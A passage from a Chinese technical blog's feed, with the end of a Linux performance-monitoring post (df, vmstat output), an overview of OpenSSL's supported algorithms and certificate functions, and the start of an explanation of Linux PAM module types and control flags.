121M  894M  12% /boot</span><br><span class="line">tmpfs                   98M     0   98M   0% /run/user/0</span><br><span class="line">[root@rhel7 ~]#</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="2-5-5-&#x6574;&#x4F53;"><a href="#2-5-5-&#x6574;&#x4F53;" class="headerlink" title="2.5.5 &#x6574;&#x4F53;"></a>2.5.5 &#x6574;&#x4F53;</h4><p><strong>vmstat</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel7 ~]# vmstat</span><br><span class="line">procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----</span><br><span class="line"> r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st</span><br><span class="line"> 2  0 220132 137404     56 185372    0    1     6     6   87   12  0  0 99  0  0</span><br><span class="line">[root@rhel7 ~]#</span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;&amp;#x6027;&amp;#x80FD;&amp;#x6D4B;&amp;#x8BD5;&amp;#x2014;&amp;#x2014;&amp;#x6027;&amp;#x80FD;&amp;#x6D4B;&amp;#x8BD5;&amp;#x5404;&amp;#x6307;&amp;#x6807;&amp;#x8BF4;&amp;#x660E;&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>OpenSSL使用教程</title>
    <link href="https://marnm.github.io//posts/e8c4eb08/"/>
    <id>https://marnm.github.io//posts/e8c4eb08/</id>
    <published>2022-06-07T04:54:01.000Z</published>
    <updated>2022-06-07T05:01:27.938Z</updated>
    
    <content type="html"><![CDATA[<h2 id="OpenSSL"><a href="#OpenSSL" class="headerlink" title="OpenSSL"></a>OpenSSL</h2><h3 id="OpenSSL&#x7684;&#x652F;&#x6301;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;"><a href="#OpenSSL&#x7684;&#x652F;&#x6301;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;" class="headerlink" title="OpenSSL&#x7684;&#x652F;&#x6301;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;"></a>OpenSSL&#x7684;&#x652F;&#x6301;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;</h3><p><strong>OpenSSL&#x4E00;&#x5171;&#x63D0;&#x4F9B;&#x4E86;8&#x79CD;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;</strong><br>7&#x79CD;&#x5206;&#x7EC4;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5; + 1&#x79CD;&#x6D41;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;RC4<br>&#x5206;&#x7EC4;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#x5206;&#x522B;&#x662F;&#xFF1A;AES&#x3001;DES&#x3001;Blowfish&#x3001;CAST&#x3001;IDEA&#x3001;RC2&#x3001;RC5</p><p><strong>&#x56DB;&#x79CD;&#x5E38;&#x7528;&#x7684;&#x5206;&#x7EC4;&#x5BC6;&#x7801;&#x52A0;&#x5BC6;&#x6A21;&#x5F0F;</strong>  </p><ul><li>&#x7535;&#x5B50;&#x5BC6;&#x7801;&#x672C;&#x6A21;&#x5F0F;&#xFF08;ECB&#xFF09;&#x3001;</li><li>&#x52A0;&#x5BC6;&#x5206;&#x7EC4;&#x94FE;&#x63A5;&#x6A21;&#x5F0F;&#xFF08;CBC&#xFF09;&#x3001;</li><li>&#x52A0;&#x5BC6;&#x53CD;&#x9988;&#x6A21;&#x5F0F;&#xFF08;CFB&#xFF09;  </li><li>&#x8F93;&#x51FA;&#x53CD;&#x9988;&#x6A21;&#x5F0F;&#xFF08;OFB&#xFF09;</li></ul><p><strong>&#x5176;&#x4E2D;&#xFF1A;</strong><br>AES&#x4F7F;&#x7528;&#x52A0;&#x5BC6;&#x53CD;&#x9988;&#x6A21;&#x5F0F;&#xFF08;CFB&#xFF09;&#x548C;&#x8F93;&#x51FA;&#x53CD;&#x9988;&#x6A21;&#x5F0F;&#xFF08;OFB&#xFF09;&#x5206;&#x7EC4;&#x957F;&#x5EA6;&#x662F;128&#x4F4D;<br>&#x5176;&#x5B83;&#x7B97;&#x6CD5;&#x4F7F;&#x7528;&#x7684;&#x5219;&#x662F;64&#x4F4D;&#x3002;<br>&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;DES&#x7B97;&#x6CD5;&#x91CC;&#x9762;&#x4E0D;&#x4EC5;&#x4EC5;&#x662F;&#x5E38;&#x7528;&#x7684;DES&#x7B97;&#x6CD5;&#xFF0C;&#x8FD8;&#x652F;&#x6301;&#x4E09;&#x4E2A;&#x5BC6;&#x94A5;&#x548C;&#x4E24;&#x4E2A;&#x5BC6;&#x94A5;3DES&#x7B97;&#x6CD5;&#x3002; </p><h3 id="OpenSSL&#x652F;&#x6301;&#x7684;&#x975E;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;"><a href="#OpenSSL&#x652F;&#x6301;&#x7684;&#x975E;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;" class="headerlink" title="OpenSSL&#x652F;&#x6301;&#x7684;&#x975E;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;"></a>OpenSSL&#x652F;&#x6301;&#x7684;&#x975E;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;</h3><p><strong>OpenSSL&#x4E00;&#x5171;&#x5B9E;&#x73B0;&#x4E86;4&#x79CD;&#x975E;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;</strong>&#xFF0C;&#x5305;&#x62EC;<code>DH</code>&#x7B97;&#x6CD5;&#x3001;<code>RSA</code>&#x7B97;&#x6CD5;&#x3001;<code>DSA</code>&#x7B97;&#x6CD5;&#x548C;&#x692D;&#x5706;&#x66F2;&#x7EBF;&#x7B97;&#x6CD5;&#xFF08;<code>EC</code>&#xFF09;&#x3002;<br><code>DH</code>&#x7B97;&#x6CD5;&#x4E00;&#x822C;&#x7528;&#x4E8E;&#x5BC6;&#x94A5;&#x4EA4;&#x6362;&#x3002;<br><code>RSA</code>&#x7B97;&#x6CD5;&#x65E2;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x5BC6;&#x94A5;&#x4EA4;&#x6362;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x6570;&#x5B57;&#x7B7E;&#x540D;&#xFF0C;&#x5F53;&#x7136;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x80FD;&#x591F;&#x5FCD;&#x53D7;&#x5176;&#x7F13;&#x6162;&#x7684;&#x901F;&#x5EA6;&#xFF0C;&#x90A3;&#x4E48;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x6570;&#x636E;&#x52A0;&#x5BC6;&#x3002;<br><code>DSA</code>&#x7B97;&#x6CD5;&#x5219;&#x4E00;&#x822C;&#x53EA;&#x7528;&#x4E8E;&#x6570;&#x5B57;&#x7B7E;&#x540D;&#x3002;</p><h3 id="OpenSSL&#x652F;&#x6301;&#x7684;&#x4FE1;&#x606F;&#x6458;&#x8981;&#x7B97;&#x6CD5;"><a href="#OpenSSL&#x652F;&#x6301;&#x7684;&#x4FE1;&#x606F;&#x6458;&#x8981;&#x7B97;&#x6CD5;" class="headerlink" title="OpenSSL&#x652F;&#x6301;&#x7684;&#x4FE1;&#x606F;&#x6458;&#x8981;&#x7B97;&#x6CD5;"></a>OpenSSL&#x652F;&#x6301;&#x7684;&#x4FE1;&#x606F;&#x6458;&#x8981;&#x7B97;&#x6CD5;</h3><p><strong>OpenSSL&#x5B9E;&#x73B0;&#x4E86;5&#x79CD;&#x4FE1;&#x606F;&#x6458;&#x8981;&#x7B97;&#x6CD5;</strong>&#xFF0C;&#x5206;&#x522B;&#x662F;<code>MD2</code>&#x3001;<code>MD5</code>&#x3001;<code>MDC2</code>&#x3001;<code>SHA&#xFF08;SHA1&#xFF09;</code>&#x548C;<code>RIPEMD</code>&#x3002;SHA&#x7B97;&#x6CD5;&#x4E8B;&#x5B9E;&#x4E0A;&#x5305;&#x62EC;&#x4E86;SHA&#x548C;SHA1&#x4E24;&#x79CD;&#x4FE1;&#x606F;&#x6458;&#x8981;&#x7B97;&#x6CD5;&#xFF0C;&#x6B64;&#x5916;&#xFF0C;OpenSSL&#x8FD8;&#x5B9E;&#x73B0;&#x4E86;DSS&#x6807;&#x51C6;&#x4E2D;&#x89C4;&#x5B9A;&#x7684;&#x4E24;&#x79CD;&#x4FE1;&#x606F;&#x6458;&#x8981;&#x7B97;&#x6CD5;DSS&#x548C;DSS1&#x3002; </p><h3 id="&#x57FA;&#x4E8E;OpenSSL&#x7684;&#x5BC6;&#x94A5;&#x4E0E;&#x8BC1;&#x4E66;&#x7BA1;&#x7406;"><a href="#&#x57FA;&#x4E8E;OpenSSL&#x7684;&#x5BC6;&#x94A5;&#x4E0E;&#x8BC1;&#x4E66;&#x7BA1;&#x7406;" class="headerlink" title="&#x57FA;&#x4E8E;OpenSSL&#x7684;&#x5BC6;&#x94A5;&#x4E0E;&#x8BC1;&#x4E66;&#x7BA1;&#x7406;"></a>&#x57FA;&#x4E8E;OpenSSL&#x7684;&#x5BC6;&#x94A5;&#x4E0E;&#x8BC1;&#x4E66;&#x7BA1;&#x7406;</h3><p>&#x5BC6;&#x94A5;&#x548C;&#x8BC1;&#x4E66;&#x7BA1;&#x7406;&#x662F;PKI&#x7684;&#x4E00;&#x4E2A;&#x91CD;&#x8981;&#x7EC4;&#x6210;&#x90E8;&#x5206;&#xFF0C;OpenSSL&#x4E3A;&#x4E4B;&#x63D0;&#x4F9B;&#x4E86;&#x4E30;&#x5BCC;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x652F;&#x6301;&#x591A;&#x79CD;&#x6807;&#x51C6;&#x3002; </p><p>&#x9996;&#x5148;&#xFF0C;OpenSSL&#x5B9E;&#x73B0;&#x4E86;ASN.1&#x7684;&#x8BC1;&#x4E66;&#x548C;&#x5BC6;&#x94A5;&#x76F8;&#x5173;&#x6807;&#x51C6;&#xFF0C;&#x63D0;&#x4F9B;&#x4E86;&#x5BF9;&#x8BC1;&#x4E66;&#x3001;&#x516C;&#x94A5;&#x3001;&#x79C1;&#x94A5;&#x3001;&#x8BC1;&#x4E66;&#x8BF7;&#x6C42;&#x4EE5;&#x53CA;CRL&#x7B49;&#x6570;&#x636E;&#x5BF9;&#x8C61;&#x7684;DER&#x3001;PEM&#x548C;BASE64&#x7684;&#x7F16;&#x89E3;&#x7801;&#x529F;&#x80FD;&#x3002;<br>OpenSSL&#x63D0;&#x4F9B;&#x4E86;&#x4EA7;&#x751F;&#x5404;&#x79CD;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x5BF9;&#x548C;&#x5BF9;&#x79F0;&#x5BC6;&#x94A5;&#x7684;&#x65B9;&#x6CD5;&#x3001;&#x51FD;&#x6570;&#x548C;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x540C;&#x65F6;&#x63D0;&#x4F9B;&#x4E86;&#x5BF9;&#x516C;&#x94A5;&#x548C;&#x79C1;&#x94A5;&#x7684;DER&#x7F16;&#x89E3;&#x7801;&#x529F;&#x80FD;&#x3002;&#x5E76;&#x5B9E;&#x73B0;&#x4E86;&#x79C1;&#x94A5;&#x7684;PKCS#12&#x548C;PKCS#8&#x7684;&#x7F16;&#x89E3;&#x7801;&#x529F;&#x80FD;&#x3002;OpenSSL&#x5728;&#x6807;&#x51C6;&#x4E2D;&#x63D0;&#x4F9B;&#x4E86;&#x5BF9;&#x79C1;&#x94A5;&#x7684;&#x52A0;&#x5BC6;&#x4FDD;&#x62A4;&#x529F;&#x80FD;&#xFF0C;&#x4F7F;&#x5F97;&#x5BC6;&#x94A5;&#x53EF;&#x4EE5;&#x5B89;&#x5168;&#x5730;&#x8FDB;&#x884C;&#x5B58;&#x50A8;&#x548C;&#x5206;&#x53D1;&#x3002; </p><p>&#x5728;&#x6B64;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;OpenSSL&#x5B9E;&#x73B0;&#x4E86;&#x5BF9;&#x8BC1;&#x4E66;&#x7684;X.509&#x6807;&#x51C6;&#x7F16;&#x89E3;&#x7801;&#x3001;PKCS#12&#x683C;&#x5F0F;&#x7684;&#x7F16;&#x89E3;&#x7801;&#x4EE5;&#x53CA;PKCS#7&#x7684;&#x7F16;&#x89E3;&#x7801;&#x529F;&#x80FD;&#x3002;&#x5E76;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x79CD;&#x6587;&#x672C;&#x6570;&#x636E;&#x5E93;&#xFF0C;<strong>&#x652F;&#x6301;&#x8BC1;&#x4E66;&#x7684;&#x7BA1;&#x7406;&#x529F;&#x80FD;&#xFF0C;&#x5305;&#x62EC;&#x8BC1;&#x4E66;&#x5BC6;&#x94A5;&#x4EA7;&#x751F;&#x3001;&#x8BF7;&#x6C42;&#x4EA7;&#x751F;&#x3001;&#x8BC1;&#x4E66;&#x7B7E;&#x53D1;&#x3001;&#x540A;&#x9500;&#x548C;&#x9A8C;&#x8BC1;&#x7B49;&#x529F;&#x80FD;&#x3002;</strong> </p><p>&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;OpenSSL&#x63D0;&#x4F9B;&#x7684;CA&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5C0F;&#x578B;&#x7684;&#x8BC1;&#x4E66;&#x7BA1;&#x7406;&#x4E2D;&#x5FC3;&#xFF08;CA&#xFF09;&#xFF0C;&#x5B9E;&#x73B0;&#x4E86;&#x8BC1;&#x4E66;&#x7B7E;&#x53D1;&#x7684;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x548C;&#x8BC1;&#x4E66;&#x7BA1;&#x7406;&#x7684;&#x5927;&#x90E8;&#x5206;&#x673A;&#x5236;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;OpenSSL&quot;&gt;&lt;a href=&quot;#OpenSSL&quot; class=&quot;headerlink&quot; title=&quot;OpenSSL&quot;&gt;&lt;/a&gt;OpenSSL&lt;/h2&gt;&lt;h3 id=&quot;OpenSSL&amp;#x7684;&amp;#x652F;&amp;#x6301;&amp;#x5BF9;&amp;#x79F
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux的PAM模块</title>
    <link href="https://marnm.github.io//posts/ee2f9f35/"/>
    <id>https://marnm.github.io//posts/ee2f9f35/</id>
    <published>2022-06-07T04:53:50.000Z</published>
    <updated>2022-06-07T05:01:53.535Z</updated>
    
    <content type="html"><![CDATA[<h3 id="&#x4E00;&#x3001;pam&#x7B80;&#x4ECB;"><a href="#&#x4E00;&#x3001;pam&#x7B80;&#x4ECB;" class="headerlink" title="&#x4E00;&#x3001;pam&#x7B80;&#x4ECB;"></a>&#x4E00;&#x3001;pam&#x7B80;&#x4ECB;</h3><p>  Linux-PAM&#xFF08;Pluggable Authentication Module for Linux&#xFF0C;Linux&#x53EF;&#x63D2;&#x5165;&#x8BA4;&#x8BC1;&#x6A21;&#x5757;&#xFF09;&#x662F;&#x4E00;&#x5957;&#x5171;&#x4EAB;&#x5E93;&#xFF0C;&#x4F7F;&#x672C;&#x5730;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x53EF;&#x4EE5;&#x968F;&#x610F;&#x9009;&#x62E9;&#x7A0B;&#x5E8F;&#x7684;&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#x3002;&#x6362;&#x53E5;&#x8BDD;&#x8BF4;&#xFF0C;&#x4E0D;&#x7528;&#xFF08;&#x91CD;&#x5199;&#x7F16;&#x5199;&#xFF09;&#x91CD;&#x65B0;&#x7F16;&#x8BD1;&#x4E00;&#x4E2A;&#x5305;&#x542B;PAM&#x529F;&#x80FD;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x6539;&#x53D8;&#x5B83;&#x4F7F;&#x7528;&#x7684;&#x8BA4;&#x8BC1;&#x673A;&#x5236;&#x3002;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x4E0B;&#xFF0C;&#x5C31;&#x7B97;&#x5347;&#x7EA7;&#x672C;&#x5730;&#x8BA4;&#x8BC1;&#x673A;&#x5236;&#xFF0C;&#x4E5F;&#x4E0D;&#x7528;&#x4FEE;&#x6539;&#x7A0B;&#x5E8F;&#x3002;</p><p>   PAM&#x4F7F;&#x7528;&#x914D;&#x7F6E;<code>/etc/pam.d/</code> &#x4E0B;&#x7684;&#x6587;&#x4EF6;&#x6765;&#x7BA1;&#x7406;&#x5BF9;&#x7A0B;&#x5E8F;&#x7684;&#x8BA4;&#x8BC1;&#x65B9;&#x5F0F;&#x3002;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x8C03;&#x7528;&#x54CD;&#x5E94;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x4ECE;&#x800C;&#x8C03;&#x7528;&#x672C;&#x5730;&#x7684;&#x8BA4;&#x8BC1;&#x6A21;&#x5757;&#x3002;&#x6A21;&#x5757;&#x653E;&#x7F6E;&#x5728;<code>/lib64/security</code>&#xFF08;x86&#x7CFB;&#x7EDF;&#x653E;&#x5728;/lib/security&#xFF09;&#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x4EE5;&#x52A0;&#x8F7D;&#x52A8;&#x6001;&#x5E93;&#x7684;&#x5F62;&#x5F0F;&#x8FDB;&#x5165;&#xFF0C;&#x50CF;&#x6211;&#x4EEC;&#x4F7F;&#x7528;su&#x547D;&#x4EE4;&#x65F6;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x63D0;&#x793A;&#x8F93;&#x5165;root&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;&#x3002;&#x8FD9;&#x5C31;&#x662F;su&#x547D;&#x4EE4;&#x901A;&#x8FC7;&#x8C03;&#x7528;PAM&#x6A21;&#x5757;&#x5B9E;&#x73B0;&#x7684;&#x3002;</p><h3 id="PAM&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4ECB;&#x7ECD;"><a href="#PAM&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4ECB;&#x7ECD;" class="headerlink" title="PAM&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4ECB;&#x7ECD;"></a>PAM&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4ECB;&#x7ECD;</h3><p>  PAM&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6709;&#x4E24;&#x79CD;&#x5199;&#x6CD5;:</p><ul><li>&#x4E00;&#x79CD;&#x662F;&#x5199;&#x5728;/etc/pam.conf&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x4F46;centos6&#x4E4B;&#x540E;&#x7684;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x5C31;&#x6CA1;&#x6709;&#x4E86;&#x3002;</li><li>&#x53E6;&#x4E00;&#x79CD;&#x5199;&#x6CD5;&#x662F;,&#x5C06;PAM&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x653E;&#x5230;/etc/pam.d/&#x76EE;&#x5F55;&#x4E0B;,&#x5176;&#x89C4;&#x5219;&#x5185;&#x5BB9;&#x90FD;&#x662F;&#x4E0D;&#x5305;&#x542B; service &#x90E8;&#x5206;&#x7684;&#xFF0C;&#x5373;&#x4E0D;&#x5305;&#x542B;&#x670D;&#x52A1;&#x540D;&#x79F0;&#xFF0C;&#x800C;/etc/pam.d &#x76EE;&#x5F55;&#x4E0B;&#x6587;&#x4EF6;&#x7684;&#x540D;&#x5B57;&#x5C31;&#x662F;&#x670D;&#x52A1;&#x540D;&#x79F0;&#x3002;&#x5982;: vsftpd,login&#x7B49;.,&#x53EA;&#x662F;&#x5C11;&#x4E86;&#x6700;&#x5DE6;&#x8FB9;&#x7684;&#x670D;&#x52A1;&#x540D;&#x5217;.&#x5982;:/etc/pam.d/sshd</li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://gitee.com/fnaichu/mypicbed/raw/master/img/202205072144562.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>&#x7531;&#x4E0A;&#x56FE;&#x53EF;&#x4EE5;&#x5C06;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5206;&#x4E3A;&#x56DB;&#x5217;&#xFF0C;<br>&#x7B2C;&#x4E00;&#x5217;&#x4EE3;&#x8868;&#x6A21;&#x5757;&#x7C7B;&#x578B;<br>&#x7B2C;&#x4E8C;&#x5217;&#x4EE3;&#x8868;&#x63A7;&#x5236;&#x6807;&#x8BB0;<br>&#x7B2C;&#x4E09;&#x5217;&#x4EE3;&#x8868;&#x6A21;&#x5757;&#x8DEF;&#x5F84;<br>&#x7B2C;&#x56DB;&#x3001;&#x4E94;&#x5217;&#x4EE3;&#x8868;&#x6A21;&#x5757;&#x53C2;&#x6570;</p><h3 id="1-PAM&#x7684;&#x6A21;&#x5757;&#x7C7B;&#x578B;"><a href="#1-PAM&#x7684;&#x6A21;&#x5757;&#x7C7B;&#x578B;" class="headerlink" title="1. PAM&#x7684;&#x6A21;&#x5757;&#x7C7B;&#x578B;"></a>1. PAM&#x7684;&#x6A21;&#x5757;&#x7C7B;&#x578B;</h3><p>Linux-PAM&#x6709;&#x56DB;&#x79CD;&#x6A21;&#x5757;&#x7C7B;&#x578B;&#xFF0C;&#x5206;&#x522B;&#x4EE3;&#x8868;&#x56DB;&#x79CD;&#x4E0D;&#x540C;&#x7684;&#x4EFB;&#x52A1;<br>&#x5B83;&#x4EEC;&#x662F;&#xFF1A;&#x8BA4;&#x8BC1;&#x7BA1;&#x7406;auth&#x3001;&#x8D26;&#x53F7;&#x7BA1;&#x7406;account&#x3001;&#x4F1A;&#x8BDD;&#x7BA1;&#x7406;session&#x3001;&#x5BC6;&#x7801;&#x7BA1;&#x7406;password&#xFF0C;&#x4E00;&#x4E2A;&#x7C7B;&#x578B;&#x53EF;&#x80FD;&#x6709;&#x591A;&#x884C;&#xFF0C;&#x5B83;&#x4EEC;&#x6309;&#x987A;&#x5E8F;&#x4E00;&#x6B21;&#x7531;PAM&#x6A21;&#x5757;&#x8C03;&#x7528;&#x3002;</p><table><thead><tr><th>&#x7BA1;&#x7406;&#x65B9;&#x5F0F;</th><th>&#x8BF4;&#x660E;</th></tr></thead><tbody><tr><td>auth</td><td>&#x7528;&#x6765;&#x5BF9;&#x7528;&#x6237;&#x7684;&#x8EAB;&#x4EFD;&#x8FDB;&#x884C;&#x8BC6;&#x522B;&#x3002;&#x5982;&#xFF1A;&#x63D0;&#x793A;&#x7528;&#x6237;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#xFF0C;&#x6216;&#x5224;&#x65AD;&#x4F7F;&#x7528;&#x662F;&#x5426;&#x4E3A;root&#x7B49;</td></tr><tr><td>account</td><td>&#x5BF9;&#x8D26;&#x53F7;&#x7684;&#x4E2A;&#x5411;&#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x68C0;&#x67E5;&#x3002;&#x5982;&#xFF1A;&#x662F;&#x5426;&#x5141;&#x8BB8;&#x767B;&#x5F55;&#xFF0C;&#x662F;&#x5426;&#x8FBE;&#x5230;&#x6700;&#x5927;&#x7528;&#x6237;&#x6570;&#xFF0C;&#x6216;&#x662F;root&#x7528;&#x6237;&#x662F;&#x5426;&#x5141;&#x8BB8;&#x5728;&#x8FD9;&#x4E2A;&#x7EC8;&#x7AEF;&#x767B;&#x5F55;&#x7B49;</td></tr><tr><td>session</td><td>&#x8FD9;&#x4E2A;&#x6A21;&#x5757;&#x7528;&#x6765;&#x5B9A;&#x4E49;&#x7528;&#x6237;&#x6265;&#x4F30;&#x524D;&#x7684;&#xFF0C;&#x53CA;&#x7528;&#x6237;&#x9000;&#x51FA;&#x540E;&#x6240;&#x8981;&#x8FDB;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x5982;&#xFF1A;&#x767B;&#x5F55;&#x8FDE;&#x63A5;&#x4FE1;&#x606F;&#xFF0C;&#x7528;&#x6237;&#x6570;&#x7684;&#x6253;&#x5F00;&#x4E0E;&#x5173;&#x95ED;&#xFF0C;&#x6302;&#x8F7D;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7B49;&#x3002;</td></tr><tr><td>password</td><td>&#x4F7F;&#x7528;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x6765;&#x66F4;&#x65B0;&#x3002;&#x5982;&#xFF1A;&#x4FEE;&#x6539;&#x7528;&#x6237;&#x5BC6;&#x7801;</td></tr></tbody></table><h3 id="2-PAM&#x7684;&#x63A7;&#x5236;&#x6807;&#x8BB0;"><a href="#2-PAM&#x7684;&#x63A7;&#x5236;&#x6807;&#x8BB0;" class="headerlink" title="2. PAM&#x7684;&#x63A7;&#x5236;&#x6807;&#x8BB0;"></a>2. PAM&#x7684;&#x63A7;&#x5236;&#x6807;&#x8BB0;</h3><p>PAM&#x4F7F;&#x7528;&#x63A7;&#x5236;&#x6807;&#x8BB0;&#x6765;&#x5904;&#x7406;&#x548C;&#x5224;&#x65AD;&#x5404;&#x4E2A;&#x6A21;&#x5757;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x3002;&#xFF08;&#x5728;&#x6B64;&#x53EA;&#x8BF4;&#x660E;&#x7B80;&#x5355;&#x7684;&#x8BA4;&#x8BC1;&#x6807;&#x8BB0;&#xFF09;</p><table><thead><tr><th>&#x63A7;&#x5236;&#x6807;&#x8BB0;</th><th>&#x8BF4;&#x660E;</th></tr></thead><tbody><tr><td>required</td><td>&#x8868;&#x793A;&#x53CA;&#x65F6;&#x67D0;&#x4E2A;&#x6A21;&#x5757;&#x5BF9;&#x7528;&#x6237;&#x7684;&#x6768;&#x5CE5;&#x5931;&#x8D25;&#xFF0C;&#x4E5F;&#x8981;&#x7B49;&#x6240;&#x6709;&#x7684;&#x6A21;&#x5757;&#x90FD;&#x6267;&#x884C;&#x5B8C;&#x6BD5;&#x540E;&#xFF0C;PAM&#x624D;&#x653E;&#x56DE;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x3002;&#x8FD9;&#x6837;&#x505A;&#x662F;&#x4E3A;&#x4E86;&#x4E0D;&#x8BA9;&#x7528;&#x6237;&#x77E5;&#x9053;&#x88AB;&#x54EA;&#x4E2A;&#x6A21;&#x5757;&#x62D2;&#x7EDD;&#x3002;&#x5982;&#x679C;&#x5BF9;&#x7528;&#x6237;&#x9A8C;&#x8BC1;&#x6210;&#x529F;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x6A21;&#x5757;&#x90FD;&#x4F1A;&#x8FD4;&#x56DE;&#x6210;&#x529F;&#x4FE1;&#x606F;&#x3002;</td></tr><tr><td>requisite</td><td>&#x4E0E;required&#x76F8;&#x4F3C;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x8FD9;&#x4E2A;&#x6A21;&#x5757;&#x8FD4;&#x56DE;&#x5931;&#x8D25;&#xFF0C;&#x5219;&#x7ACB;&#x523B;&#x5411;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x8FD4;&#x56DE;&#x5931;&#x8D25;&#xFF0C;&#x8868;&#x793A;&#x6B64;&#x7C7B;&#x578B;&#x5931;&#x8D25;&#x3002;&#x4E0D;&#x518D;&#x8FDB;&#x884C;&#x540E;&#x9762;&#x7684;&#x64CD;&#x4F5C;&#x3002;</td></tr><tr><td>sufficient</td><td>&#x8868;&#x793A;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x6A21;&#x5757;&#x7684;&#x9A8C;&#x8BC1;&#xFF0C;PAM&#x7ED3;&#x6784;&#x5C31;&#x7ACB;&#x523B;&#x8FD4;&#x56DE;&#x9A8C;&#x8BC1;&#x6210;&#x529F;&#x4FE1;&#x606F;&#xFF08;&#x5373;&#x4F7F;&#x524D;&#x9762;&#x6709;&#x6A21;&#x5757;fail&#x4E86;&#xFF0C;&#x4E5F;&#x4F1A;&#x628A;fail&#x7ED3;&#x679C;&#x5FFD;&#x7565;&#x6389;&#xFF09;&#xFF0C;&#x628A;&#x63A7;&#x5236;&#x6743;&#x4EA4;&#x56DE;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x3002;&#x540E;&#x9762;&#x7684;&#x5